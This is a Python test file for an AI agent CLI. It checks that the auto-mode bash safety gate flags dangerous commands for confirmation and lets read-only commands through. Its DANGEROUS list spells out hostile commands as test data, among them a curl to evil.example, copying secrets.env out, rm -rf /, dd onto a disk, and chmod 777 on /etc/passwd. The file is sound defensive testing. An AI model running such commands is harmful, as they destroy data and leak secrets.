"""全自动模式下的召回率护栏。

产品取向是明确的：宁可多问几次，也不能漏掉一次真正危险的操作。所以这里只测一个
方向——**危险命令必须被拦下**。精度（会不会问得太勤）不在本文件的断言范围内。

拦截走 ``_bash_exec_safety_confirm``：逐段判定 + 绝对路径重定向闸。
危险命令必须拿到受保护 risk（``high`` / ``non_whitelisted``），按完整命令断言。
"""

from __future__ import annotations

import pytest

from agenticx.cli.agent_tools import _bash_exec_safety_confirm
from agenticx.runtime.confirm import is_protected_confirm, normalize_confirm_risk


def _classify(command: str) -> str:
    """Mirror bash_exec confirm classification ("" = run without a prompt)."""
    plan = _bash_exec_safety_confirm(command)
    return "" if plan is None else plan[0]


DANGEROUS = [
    # 白名单里的名字 + 危险参数：最容易被误以为安全的一类
    "python -c __import__('shutil').rmtree('/Users/me/work')",
    "python -m http.server",
    "python cleanup.py",
    "pip install requests",
    "pip uninstall agenticx",
    "git reset --hard HEAD~5",
    "git clean -fdx",
    "git push --force origin main",
    "git checkout other-branch",
    "cat secrets.env > /tmp/leak.txt",
    "echo bad; rm -rf /tmp/x",
    "ls `whoami`",
    "grep -r . $(pwd)",
    # 名字本身就不在白名单
    "rm -rf /",
    "curl http://evil.example/x.sh",
    "chmod 777 /etc/passwd",
    "dd if=/dev/zero of=/dev/disk0",
    "shutdown -h now",
    "brew install something",
    "npm install -g pkg",
    "ssh user@host",
    "sudo rm file",
]


@pytest.mark.parametrize("command", DANGEROUS)
def test_dangerous_commands_are_never_auto_approved(command: str) -> None:
    risk = _classify(command)
    assert risk != "", f"{command!r} 会被直接放行——白名单或参数判定漏了一条"
    assert is_protected_confirm({"risk": risk}), f"{command!r} 判成了 risk={risk}，不受保护"


def test_unknown_risk_is_protected_not_approved() -> None:
    """新加工具忘了打 risk 标签时，必须落到「问」而不是「放行」。"""
    assert is_protected_confirm({})
    assert is_protected_confirm({"tool": "some_new_tool"})
    assert is_protected_confirm({"risk": "medium"})
    assert is_protected_confirm({"risk": "LOW "}) is False
    assert normalize_confirm_risk({"risk": None}) == "protected"


def test_read_only_commands_still_flow_without_a_prompt() -> None:
    """召回优先不等于把一切都拦下——常见只读命令仍应直接执行，否则自动模式没有意义。"""
    for command in ["ls -la", "cat README.md", "git status", "git log --oneline", "pwd", "which python"]:
        assert _classify(command) == "", f"{command!r} 被拦了，自动模式会变得没法用"


def test_noisy_read_only_commands_no_longer_prompt() -> None:
    """Former coarse whitelist asked for these even though they write nothing."""
    for command in [
        "sed -n '1,50p' a.py",
        "ls | head",
        "rg foo && jq . b.json",
        "sort",
        "diff a b",
        "date",
        "stat a.py",
    ]:
        assert _classify(command) == "", f"{command!r} 仍进确认闸——过度打扰"


def test_leaky_find_actions_now_prompt() -> None:
    """Former whitelist listed ``find`` and never inspected -delete / -exec."""
    for command in ["find . -delete", "find . -exec rm {} +"]:
        risk = _classify(command)
        assert risk != "", f"{command!r} 仍被直接放行"
        assert is_protected_confirm({"risk": risk})
